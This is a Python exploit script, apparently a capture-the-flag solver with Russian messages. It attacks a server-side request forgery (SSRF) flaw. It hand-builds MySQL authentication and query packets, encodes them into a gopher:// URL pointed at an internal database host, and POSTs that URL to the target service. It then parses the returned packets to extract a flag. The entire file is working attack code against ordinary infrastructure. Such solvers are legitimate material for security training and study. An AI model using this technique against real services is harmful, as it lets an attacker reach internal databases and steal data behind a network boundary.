#!/usr/bin/env python3
import re
import struct
import sys
import urllib.error
import urllib.parse
import urllib.request


MYSQL_CAPABILITIES = 0x000A8205
MYSQL_CHARSET_UTF8_GENERAL_CI = 45
MYSQL_MAX_PACKET = 16 * 1024 * 1024


def mysql_packet(payload, sequence_id):
    if len(payload) >= 1 << 24:
        raise ValueError("MySQL-пакет слишком большой")
    return len(payload).to_bytes(3, "little") + bytes([sequence_id]) + payload


def build_mysql_request():
    auth_payload = struct.pack(
        "<IIB23s",
        MYSQL_CAPABILITIES,
        MYSQL_MAX_PACKET,
        MYSQL_CHARSET_UTF8_GENERAL_CI,
        b"\x00" * 23,
    )
    auth_payload += b"reader\x00\x00mysql_native_password\x00"

    query = b"\x03SELECT secret FROM audit.evidence WHERE id = 1"
    return mysql_packet(auth_payload, 1) + mysql_packet(query, 0)


def build_gopher_url():
    payload = build_mysql_request()
    encoded_payload = urllib.parse.quote_from_bytes(payload, safe="")
    return f"gopher://db:3306/_{encoded_payload}"


def request_ssrf(target_url):
    form = urllib.parse.urlencode({"url": build_gopher_url()}).encode("ascii")
    request = urllib.request.Request(target_url, data=form, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    request.add_header("Content-Length", str(len(form)))
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            return response.read()
    except (OSError, urllib.error.URLError, urllib.error.HTTPError) as error:
        raise RuntimeError(
            "не удалось обратиться к сервису с уязвимостью подделки "
            "серверных запросов (SSRF)"
        ) from error


def parse_mysql_packets(response):
    packets = []
    offset = 0
    while offset + 4 <= len(response):
        payload_length = int.from_bytes(response[offset : offset + 3], "little")
        sequence_id = response[offset + 3]
        payload_start = offset + 4
        payload_end = payload_start + payload_length
        if payload_end > len(response):
            raise ValueError("ответ MySQL содержит неполный пакет")
        packets.append((sequence_id, response[payload_start:payload_end]))
        offset = payload_end
    if offset != len(response) or not packets:
        raise ValueError("ответ не похож на поток пакетов MySQL")
    return packets


def extract_flag(response):
    packets = parse_mysql_packets(response)
    if not packets[0][1].startswith(b"\x0a"):
        raise ValueError("первый пакет не является приветствием MySQL")
    if not any(payload.startswith(b"\x00") for _sequence, payload in packets[1:]):
        raise ValueError("в ответе нет подтверждения входа в MySQL")
    match = re.search(rb"flag\{[^}\r\n]+\}", response)
    if not match:
        raise ValueError("ответ внутренней базы не содержит флаг")
    return match.group(0).decode("ascii")


def main():
    if len(sys.argv) != 2:
        print(
            "Использование: solve.py <адрес сервиса с уязвимостью подделки "
            "серверных запросов (SSRF)>",
            file=sys.stderr,
        )
        return 2
    try:
        print(extract_flag(request_ssrf(sys.argv[1])))
    except (RuntimeError, ValueError) as error:
        print(f"Ошибка: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
